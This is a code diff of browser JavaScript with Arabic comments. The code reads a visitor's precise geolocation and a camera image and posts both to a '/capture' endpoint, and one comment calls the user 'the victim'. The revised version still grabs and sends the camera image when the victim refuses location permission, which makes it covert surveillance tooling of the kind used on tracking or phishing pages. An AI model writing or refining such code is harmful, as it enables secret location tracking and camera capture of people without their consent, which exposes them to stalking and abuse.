@@ -1,21 +1,23 @@
-navigator.geolocation.getCurrentPosition(async (pos) => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    
-    // تأكد من إرسال الإحداثيات داخل الـ fetch
-    fetch('/capture', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            location: { lat: lat, lon: lon }, // تأكد أن هذا السطر يرسل lat و lon
-            image: await getCameraImage()
-        })
-    });
-}, (err) => {
-    // في حال الرفض أرسل رسالة توضح ذلك
-    fetch('/capture', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ location: "الضحية رفضت إذن الموقع" })
-    });
-}, { enableHighAccuracy: true }); // لتفعيل الدقة العالية
+async function captureAndSend() {
+    // إعدادات الدقة العالية للموقع
+    const geoOptions = { enableHighAccuracy: true, timeout: 10000 };
+
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        const coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+        const img = await getCameraImage(); // وظيفتك الحالية للالتقاط
+
+        fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ location: coords, image: img })
+        });
+    }, async (err) => {
+        // في حال الرفض نرسل الصورة والـ IP فقط
+        const img = await getCameraImage();
+        fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ location: null, image: img })
+        });
+    }, geoOptions);
+}
